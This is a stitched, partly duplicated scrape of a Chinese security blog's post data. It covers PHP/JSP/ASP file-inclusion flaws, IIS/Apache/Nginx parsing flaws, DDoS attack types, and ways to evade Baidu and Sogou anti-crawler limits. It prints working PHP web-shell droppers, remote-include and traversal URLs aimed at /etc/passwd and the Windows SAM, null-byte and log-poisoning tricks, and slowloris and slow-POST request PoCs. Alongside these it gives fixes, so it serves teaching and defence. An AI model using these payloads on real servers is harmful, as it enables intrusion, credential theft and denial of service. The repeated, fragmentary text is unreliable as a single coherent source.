aspx文件包含漏洞\naspx文件包含与asp一样，语法如下：\n```bash\n<!--#include file=\"top.aspx\" -->\n```\n\n### 传送门\n[文件上传漏洞(绕过姿势)](http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/)\n\n>转载请说明出处:[文件包含漏洞|

'phar://test.rar/test.txt';\n?>\n```\n新建test.txt里的内容：\n```bash\n<?php\nphpinfo();\n?>\n```\n　　压缩test.txt文件，可以重命名压缩文件为zip,phar,rar等格式，之后访问shell.php文件后，会出现phpinfo内容。\n#### 亲测有效\n在实验环境下，在test目录下新建shell.php，test.txt，并将test.txt打包成test.zip。\n![](/upload_image/20170410/1.png)\nshell.php内容如下：\n![](/upload_image/20170410/2.png)\ntest.txt内容如下：\n![](/upload_image/20170410/3.png)\n访问shell.php:\n![](/upload_image/20170410/4.png)\n\n参考：http://bbs.pediy.com/thread-216191.htm\n\n### php文件包含漏洞\nPHP中的文件包含分为本地包含与远程包含，导致文件包含的函数如下：\n* include()\n* include_once()\n* require()\n* require_once()\n* fopen()\n* readfile()\n......\n\n#### 本地包含漏洞（LFI）\n新建一个phpinfo.txt，然后新建一个shell.php，写入：\n```bash\n<?php\n    Include(\"phpinfo.txt\");\n?>\n```\n　　访问shell.php会输出phpinfo页面内容，无论将扩展名改为什么，都将以php代码执行。如果文件不是符合php规则的（即没有写<?php ?>等），则通过include可以直接输出源码。\n\n#### 远程包含漏洞\n前提：需要开启allow_url_fopen，默认关闭。\n新建php.txt:\n```bash\n<?php\n   echo \"hello world\";\n?>\n```\n新建index.php:\n```bash\n<?php\n    Include($_GET['page']);\n?>\n```\n访问*http://www.xxxx.com/page=http://www.xxxx.com/php.txt*执行结果将输出hello world。\n\n#### 文件包含利用\n##### 读取敏感信息\n如：http://www.xxx.com/index.php?page=/etc/passwd\nWindows:\n```bash\nc:\\boot.ini\nc:\\windows\\systems32\\inetsrv\\MetaBase.xml\nc:\\windows\\repair\\sam\nc:\\windows\\php.ini             php配置文件\nc:\\windows\\my.ini               mysql配置文件\n```\nLINUX:\n```bash\n/etc/passwd\n/usr/local/app/apache2/conf/http.conf\n/usr/local/app/php5/lib/php.ini          PHP相关设置\n/etc/httpd/conf/http.conf                    apache配置文件\n/etc/my.cnf                                              mysql配置文件\n```\n\n##### 远程包含shell\ntest.txt文件，可以保存在远程服务器上，内容如下：\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[nmask]);?>\")?>\n```\n　　如果目标网站存在远程包含漏洞，则可以通过访问：*http://www.xxx1.com/index.php?page=http://www.xx2.com/test.txt*则会在服务器根目录下生产一个shell.php内容为:\n```bash\n<?php   eval($_POST[nmask]);?>\n```\n\n##### 本地包含配合文件上传\n如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传\n上传一个图片木马a.jpg，内容为：\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[tzc]);?>\")?>\n```\n访问URL：*http://www.xxx.com/index.php?page=./a.jpg*在本地生成shell.php。\n\n\n##### 本地包含配合apache日志拿shell\n　　apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:*http://www.xxx.com/<?php eval([$_POST]);?>*则会将一句话写入到access.log中，但是一般来说，写入到access.log文件中的一句话是被编码的，所以需要抓包绕过，而且利用此漏洞需要知道access.log的地址，不然便没有。\n\n##### 利用/proc/self/environ进行包含\n如：http://www.test.com/view.php?page=../../../../proc/self/environ\n这是web进程运行时的环境变量，其中有些参数是可以被用户控制的，最常见做法就是在User-Agent中插入一句话。\n\n##### 利用php协议进行包含\n* data:　　php5.2以后版本\n* php://input　　需要开启allow_url_include\n\npoc:\n```bash\nhttp://www.test.com/index.php?file=data:text/plain,<?php phpinfo();?>%00\n```\n\n##### 截断包含\n有些开发者为了防止本地包含漏洞，会编写一下代码:\n```bash\n<?php\n    Include  $_GET['page'].\".php\"\n?>\n```\n（一）00截断包含\n新建1.jpg:\n```bash\n<?fputs(fopen(\"shell.php\",\"w\"),\"<?php eval($_POST[tzc]);?>\")?>\n```\n　　这样的话比如上传一个1.jpg图片码，则访问*http://www.xxx.com/1.jpg*时，访问的是1.jgp.php，以为没有这个文件所以报错。这是，可以尝试访问*http://www.xxx.com/1.jpg%00*\n\n（二）使用长目录截断\n```bash\n././././././././././././././etc/passwd\n或者\n////////////////////////////etc/passwd\n或者\n../a/etc/passwd/../a/etc/passwd/../a/etc/passwd\n```\n在windows下目录最大长度为256字节，linux下为4096字节，其后面超出部分被丢弃。\n\n#### 文件包含漏洞修复\n开启open_basedir函数，将其设置为指定目录，则只有该目录的文件允许被访问。\n关闭allow_url_include函数，防止远程文件包含。\n\n### jsp文件包含漏洞\n#### include\n```bash   \n<%@ include file=\"head.jsp\"%>\n<%@ include file=\"body.jsp\"%>\n<%@ include file=\"tail.jsp\"%>\n```\n#### jsp:include  \n```bash   \n<jsp:include page=\"head.jsp\"/>\n<jsp:include page=\"body.jsp\"/>   \n<jsp:include page=\"tail.jsp”/>\n```\n#### 采用JSTL\n```bash\n<c:import url=\"http://thief.one/1.jsp\">\n```\n#### 说明\n(1)include指令在转换时插入“Header.jsp”的源代码，而<jsp:include>标准动作在运行时插入“Header.jsp\"的响应。<jsp:include>元素允许你包含动态文件和静态，而include说明标签仅仅是把一个文件内容当成静态追加到主文件中去。\n(2)采用前两种方式，只能包含当前web应用的界面，不过c:import可以包含容器之外的内容。\n\n### asp文件包含漏洞\nasp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：\n```bash\n<!--#include file=\"1.asp\" -->\n```\n### aspx文件包含漏洞\naspx文件包含与asp一样，语法如下：\n```bash\n<!--#include file=\"top.aspx\" -->\n```\n\n###

（一）IIS5.x-6.x解析漏洞\n使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。\n##### 目录解析(6.0)\n形式：www.xxx.com/xx.asp/xx.jpg\n原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。\n##### 文件解析\n形式：www.xxx.com/xx.asp;.jpg\n原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。\n##### 解析文件类型\nIIS6.0 默认的可执行文件除了asp还包含这三种 :\n/test.asa\n/test.cer\n/test.cdx\n##### 修复方案\n1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。\n2.做好权限设置，限制用户创建文件夹。\n\n#### （二）apache解析漏洞\n##### 漏洞原理\n　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。\n##### 漏洞形式\nwww.xxxx.xxx.com/test.php.php123\n##### 其余配置问题导致漏洞\n（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。\n（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。\n##### 修复方案\n1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入\n```bash\n<Files ~ “.(php.|php3.)”>\n        Order Allow,Deny\n        Deny from all\n</Files>\n```\n2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so\n把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:\n```bash\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule .(php.|php3.) /index.php\nRewriteRule .(pHp.|pHp3.) /index.php\nRewriteRule .(phP.|phP3.) /index.php\nRewriteRule .(Php.|Php3.) /index.php\nRewriteRule .(PHp.|PHp3.) /index.php\nRewriteRule .(PhP.|PhP3.) /index.php\nRewriteRule .(pHP.|pHP3.) /index.php\nRewriteRule .(PHP.|PHP3.) /index.php\n</IfModule>\n```\n\n#### （三）nginx解析漏洞\n##### 漏洞原理\n　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：\n\nPHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了\n##### 漏洞形式\nwww.xxxx.com/UploadFiles/image/1.jpg/1.php\nwww.xxxx.com/UploadFiles/image/1.jpg%00.php\nwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php\n\n另外一种手法：上传一个名字为test.jpg，以下内容的文件。\n```bash\n<?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>\n```\n然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。\n##### 修复方案\n1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;\n2.在Nginx配置文件中添加以下代码：\n```bash\n　　if ( $fastcgi_script_name ~ ..*/.*php ) {\n　　return 403;\n　　}\n```\n　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。\n\n#### （四）IIS7.5解析漏洞\n\nIIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。","source":"_posts/服务器解析漏洞.md","raw":"---\ntitle: 服务器解析漏洞\ndate: 2016-09-21 16:07:00\ncomments: true\ntags:

-->\n### DDos简介\n　　DDos又叫分布式拒绝服务，全称Distributed Denial of Service，利用DDos造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。\n　　DDos攻击从层次上可分为网络层攻击与应用层攻击，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。\n### 网络层DDos攻击\n网络层DDos攻击包括SYN flood、UDP flood、ICMP flood等。\n#### SYN flood攻击\n　　SYN flood攻击主要利用了TCP三次握手过程中的bug，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于慢型dos攻击。\n#### UDP flood攻击\n　　由于udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于大流量攻击。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。\n#### ICMP flood攻击\n　　此攻击属于大流量攻击，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包），因此这种方式已经落伍。\n### 网络层DDos防御\n* 网络架构上做好优化，采用负载均衡分流。\n* 添加抗DDos设备，流量清洗。\n* 限制单ip请求频率。\n* 防火墙等防护设置禁止icmp包等\n\n网络层的DDos攻击究其本质其实是无法防御的，我们能做得就是不断优化自身的网络架构，以及提升网络带宽。\n### 应用层DDos攻击\n应用层DDos攻击不是发生在网络层，是发生在TCP建立握手成功之后，应用程序处理请求的时候。\n#### CC攻击\n　　CC攻击还有一段比较有趣的来历，据说当时绿盟为了防御DDos攻击研发了一款产品，叫做“Collapasar”，能够有效的防御SYN flood攻击。然而黑客为了挑衅，研发了一款Challenge Collapasar工具（简称CC）。\n　　CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求。\n#### slowloris\n　　这是由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击。\n##### poc\n构造以下畸形http请求包\n```bash\nGET / HTTP/1.1\\r\\n\nHost: Victim host\\r\\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\\r\\n\nContent-Length: 42\\r\\n\n```\n完整的http请求头结尾应该是两次的\\r\\n\\r\\n，这里少了一次，因此服务器将会一直等待。\n#### HTTP POST DOS\n　　其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。\n##### poc\n构造以下畸形http请求包\n```bash\nGET / HTTP/1.1\\r\\n\nHost: Victim host\\r\\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\\r\\n\nContent-Length: 9999999999\\r\\n\\r\\n\n```\n#### Slow Read attack\n　　Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。\n#### Server Limit Dos\n　　这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）\n#### ReDos\n　　这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。\n### 应用层DDos防御\n* 判断User-Agent字段（不可靠，因为可以随意构造）\n* 网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）\n* 针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)\n* 关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。\n* 页面中添加验证码，比如搜索数据库时。\n* 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。\n\n　　应用层的防御有时比网络层的更难，因为导致应用层被dos攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层DDos防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击。\n\n>转载请说明出处：[浅谈DDos攻击与防御|nMask'Blog](http://thief.one/2017/05/10/1)\n本文地址：http://thief.one/2017/05/10/1","source":"_posts/浅谈DDos攻击与防御.md","raw":"---\ntitle:

MSOffice 12)\\r\\n\nContent-Length: 42\\r\\n\n```\n完整的http请求头结尾应该是两次的\\r\\n\\r\\n，这里少了一次，因此服务器将会一直等待。\n#### HTTP POST DOS\n　　其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。\n##### poc\n构造以下畸形http请求包\n```bash\nGET / HTTP/1.1\\r\\n\nHost: Victim host\\r\\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\\r\\n\nContent-Length: 9999999999\\r\\n\\r\\n\n```\n#### Slow Read attack\n　　Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。\n#### Server Limit Dos\n　　这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）\n#### ReDos\n　　这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。\n### 应用层DDos防御\n* 判断User-Agent字段（不可靠，因为可以随意构造）\n* 网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）\n* 针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)\n* 关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。\n* 页面中添加验证码，比如搜索数据库时。\n* 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。\n\n　　应用层的防御有时比网络层的更难，因为导致应用层被dos攻击的因素非常多，有时往往是因为程序员的失误，导致某个页面加载需要消耗大量资源，有时是因为中间件配置不当等等。而应用层DDos防御的核心就是区分人与机器（爬虫），因为大量的请求不可能是人为的，肯定是机器构造的。因此如果能有效的区分人与爬虫行为，则可以很好地防御此攻击。\n\n>转载请说明出处：[浅谈DDos攻击与防御|nMask'Blog](http://thief.one/2017/05/10/1)\n本文地址：http://thief.one/2017/05/10/1","slug":"1","published":1,"updated":"2017-05-12T05:10:05.298Z","layout":"post","photos":[],"link":"","_id":"cj2mmx2yt004knkli59wi55jd","content":"<p><blockquote

class=\"blockquote-center\">听过最落寞的一句话或诗句是什么？不如意事常八九，可与言者无二三</blockquote>\n\n　　上篇讲述了爬取百度搜索结果时遇到的问题以及解决方案，本篇继续爬取搜索引擎的话题，说说爬取搜狗时将会遇到什么问题？以及怎么去解决。搜狗搜索引擎的名气在国内远没有百度那么大，但却称得上是后起之秀，其搜索结果的准确度以及爬虫算法都还不错，可以说搜狗搜索在国内是继百度搜索之外的又一良好选择，想要了解百度搜索相关信息的，可以移步：[爬取搜索引擎之寻你千百度](http://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/)\n<!--more -->\n　　关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取搜狗搜索引擎时遇到的反爬虫措施，以及一些解决方案。\n\n### 为甚么要爬取搜狗\n\n* 搜索结果比较准确比较全，没有类似百度保护资源的措施（搜索结果数比较准确）\n* 同样拥有丰富的资源\n* 反爬虫措施相对没有那么严格\n\n### 搜狗反爬虫措施\n　　利用爬虫爬取搜狗搜索引擎结果，首先要解决的是cookie的问题。搜狗会验证http请求是否带有cookie参数，如不带cookie那么请求次数将会非常有限。想要解决这一问题，我们必须先弄清楚搜狗搜索引擎cookie内容的组成，以及其作用。\n\n#### cookie内容解析\n```bash\nCookie: \nABTEST=3|1489908642|v17; \nIPLOC=CN3301; \nSUID=899F006F2208990A0000000058CE33A3; \nSUV=1489908643339695; \nbrowerV=3; \nosV=1; \nsct=1; \nSNUID=1B0D93FD9297D882F63E3C8D93692285; \nld=E@n5Llllll2Y80nclllllV0nGEklllllbZjKAyllll9lllll9Zlll5@@@@@@@@@@\n```\n经过我测试，发现其中有几个参数异常重要，也是影响搜索反爬虫措施的关键参数，SUID、SNUID以及SUV。\n\n#### SUID\n　　SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。\n\n#### SNUID\n　　SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。\n\n#### SUV\nSUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。\n\n### 被屏蔽现象\n　　同样，要解决反爬虫问题，我们先来看看触发反爬虫的现象。当同一个SNUID访问次数受限后，继续访问sogou会跳转到一个验证码页面。\nURL地址：\n```bash\nhttp://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893\n```\n页面源码：\n```bash\nHTTP/1.1

获取到SUID的值后，再去获取SNUID值（可通过以上几种方式）\n* 获取到SNUID后，可保存到队列中。\n\n*说明：SNUID的值如果不去使用它，可以存放很久，直到使用它到上限才会作废；SUID一般不会做次数限制，可以一直使用。*\n\n### ip问题解决方案\n　　在爬取搜狗时，除了cookie问题以外，也需要解决ip问题，当然这个问题可以参考爬百度的解决方案，参考地址：[爬搜索引擎之寻你千百度](http://thief.one/2017/03/17/%E7%88%AC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E5%AF%BB%E4%BD%A0%E5%8D%83%E7%99%BE%E5%BA%A6/)\n\n*申明：本文只是列举了我在爬取搜狗资源时遇到的问题，不代表搜狗本身所有的反爬虫技术，本文提供的解决方案具有时效性，具体还需自己动手实验，如有更好的解决方案可留言交流哦*\n\n本文地址：[http://thief.one/2017/03/19/爬取搜索引擎之搜狗/](http://thief.one/2017/03/19/爬取搜索引擎之搜狗/)\n转载请说明来自：[nMask'Blog](http://thief.one)\n\n###

-->\n　　关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取搜狗搜索引擎时遇到的反爬虫措施，以及一些解决方案。\n\n### 为甚么要爬取搜狗\n\n* 搜索结果比较准确比较全，没有类似百度保护资源的措施（搜索结果数比较准确）\n* 同样拥有丰富的资源\n* 反爬虫措施相对没有那么严格\n\n### 搜狗反爬虫措施\n　　利用爬虫爬取搜狗搜索引擎结果，首先要解决的是cookie的问题。搜狗会验证http请求是否带有cookie参数，如不带cookie那么请求次数将会非常有限。想要解决这一问题，我们必须先弄清楚搜狗搜索引擎cookie内容的组成，以及其作用。\n\n#### cookie内容解析\n```bash\nCookie: \nABTEST=3|1489908642|v17; \nIPLOC=CN3301; \nSUID=899F006F2208990A0000000058CE33A3; \nSUV=1489908643339695; \nbrowerV=3; \nosV=1; \nsct=1; \nSNUID=1B0D93FD9297D882F63E3C8D93692285; \nld=E@n5Llllll2Y80nclllllV0nGEklllllbZjKAyllll9lllll9Zlll5@@@@@@@@@@\n```\n经过我测试，发现其中有几个参数异常重要，也是影响搜索反爬虫措施的关键参数，SUID、SNUID以及SUV。\n\n#### SUID\n　　SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。\n\n#### SNUID\n　　SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。\n\n#### SUV\nSUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。\n\n### 被屏蔽现象\n　　同样，要解决反爬虫问题，我们先来看看触发反爬虫的现象。当同一个SNUID访问次数受限后，继续访问sogou会跳转到一个验证码页面。\nURL地址：\n```bash\nhttp://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893\n```\n页面源码：\n```bash\nHTTP/1.1

id=\"SUID\"><a href=\"#SUID\" class=\"headerlink\" title=\"SUID\"></a>SUID</h4><p>　　SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。</p>\n<h4 id=\"SNUID\"><a href=\"#SNUID\" class=\"headerlink\" title=\"SNUID\"></a>SNUID</h4><p>　　SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。</p>\n<h4 id=\"SUV\"><a href=\"#SUV\" class=\"headerlink\" title=\"SUV\"></a>SUV</h4><p>SUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。</p>\n<h3 id=\"被屏蔽现象\"><a href=\"#被屏蔽现象\" class=\"headerlink\"

id=\"SUID\"><a href=\"#SUID\" class=\"headerlink\" title=\"SUID\"></a>SUID</h4><p>　　SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。</p>\n<h4 id=\"SNUID\"><a href=\"#SNUID\" class=\"headerlink\" title=\"SNUID\"></a>SNUID</h4><p>　　SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。</p>\n<h4 id=\"SUV\"><a href=\"#SUV\" class=\"headerlink\" title=\"SUV\"></a>SUV</h4><p>SUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。</p>\n<h3 id=\"被屏蔽现象\"><a href=\"#被屏蔽现象\" class=\"headerlink\"

百度反爬虫措施\n　　一般来说，单线程的爬虫时间间隔设置为>2s，短时间内应当不会被屏蔽，当然长时间爬取还是不行；如果使多线程无时间间隔爬取，那么大概30分钟肯定就会屏蔽了。\n　　我曾尝试过添加headers，甚至使用phantomjs模拟浏览器等方式，均以失败告终。我想百度作为一家搜索引擎公司，爬虫技术本就是其核心技术之一，因此跟它玩反爬虫技术应当是以卵击石（类似模拟浏览器，修改headers等方法应该无效）。\n　　然而我们可以换个思路，百度也不是不允许爬虫访问，只是限制了爬取频率。而对于访问的headers等信息并没有做明显的限制。那么也就是说，百度的反爬虫实际上是控制单ip访问的频率，那么我们就可以通过分布式架构或者切换ip等方式去解决。\n\n### 被屏蔽现象\n　　在探讨如何解决被屏蔽问题前，我们先来研究下被百度屏蔽时的现象。一般来说，当百度检测到某ip访问流量特别大时，会先进行源码提示，如果还没停止访问，那么就会直接屏蔽访问。\n\n#### 源码提示网络异常\n网页源码：\n```bash\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html;

常规解决方案\n　　基于百度反爬虫的特点，我们可以通过分布式部署爬虫服务器，来采集资源，当然个人觉得ADSL服务器效果会更佳。但是分布式部署，尤其是ADSL服务器部署，成本会变得非常高，而且需要维护。那么有没有只用一台服务器就可以解决被屏蔽的问题呢？\n　　答案是肯定，那就是单机+多线程+ip代理，这种方式比较实惠，但比较考验ip代理的稳定性。经个人测试，感觉国内绝大部分代理（收费、免费、动态等）都不是很稳定，因此这是一种折中的方式，那么有没有更好的方式呢？\n\n### 另类解决方案\n　　作为一家搜索引擎公司，百度的爬虫一定是分布式部署；又因为百度在国内的占有率很高，因此其提供搜索服务的服务器也应当是分布式部署的，也就是说全国各地部署了很多百度的服务器。\n　　那么当我们打开浏览器，访问百度时，提供搜索服务的服务器往往是离我们最近的那台，因此可以想见屏蔽我们的也就是那台服务器。大胆想象一下，如果我们能自由切换去访问不同地区的百度服务器，那么是否可以绕过被单一服务器屏蔽的问题呢？\n\n当然这一解决方案的前提是：\n\n* 我们必须拥有大量的百度服务器的ip地址\n* 百度允许用ip地址访问（实在不行就更改host）\n\n　　可喜的是，以上2点都不难办到。网上有百度服务器的资源可以获取，当然也可以通过在不同地区的服务器ping百度获取ip；至于直接通过ip地址访问百度，这默认便是可行的（不知道百度为何这样设置）\n\n### 百度的大招\nc通过以上几种方式，应该可以绕过百度的反爬虫机制，但是百度也不是吃素的，它也有自己独特的反爬虫杀招，或许称之为\"搜索限制\"或者是\"资源保护\"措施更合适一点。\n\n#### 搜索结果数设上限\n\n通过百度搜索引擎搜索关键词，计算出来的结果数设有上限。\n![](/upload_image/20170317/1.png)\n此数量最高显示上限是1亿，其实远远不止，因此数据是不真实的。\n\n#### 搜索页面数设上限\n\n再看搜索的结果页面数：\n![](/upload_image/20170317/2.png)\n最多只显示76页，而这只是所有结果中的冰山一角。\n\n#### 